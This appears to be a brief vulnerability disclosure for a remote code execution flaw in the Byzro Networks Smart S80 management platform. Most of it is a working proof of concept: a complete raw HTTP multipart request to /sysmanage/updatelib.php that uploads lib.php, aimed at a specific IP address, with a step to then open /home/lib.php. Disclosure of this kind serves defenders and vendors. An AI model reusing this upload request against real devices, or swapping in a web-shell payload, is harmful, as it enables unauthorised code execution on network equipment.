Byzro Networks Smart S80 management platform has rce vulnerability

version:S80

1. The login interface is as shown in the figure.

![image](https://github.com/Carol7S/cve/assets/61347536/c9c8e080-48ef-4951-86a0-dc7739251fb3)

2. Construct the POC and successfully upload the lib.php file

POC

```
POST /sysmanage/updatelib.php? HTTP/1.1
Host: 125.67.126.126:8443
Cookie: PHPSESSID=0d7f26e9540305f56c8a19dde3b88751
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 700
Origin: https://125.67.126.126:8443
Referer: https://125.67.126.126:8443/sysmanage/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="ck"

radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="file_upload"; filename="lib.php"
Content-Type: application/octet-stream

12345
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hid_tftp_ip"


-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hid_ftp_ip"


-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

set
-----------------------------42328904123665875270630079328—
```
![image](https://github.com/Carol7S/cve/assets/61347536/22a23ace-508c-4f55-aab7-3bc0fdc4f000)

3.Visit /home/lib.php

![image](https://github.com/Carol7S/cve/assets/61347536/bd00b4de-1b67-499d-ad1c-39006afe467f)

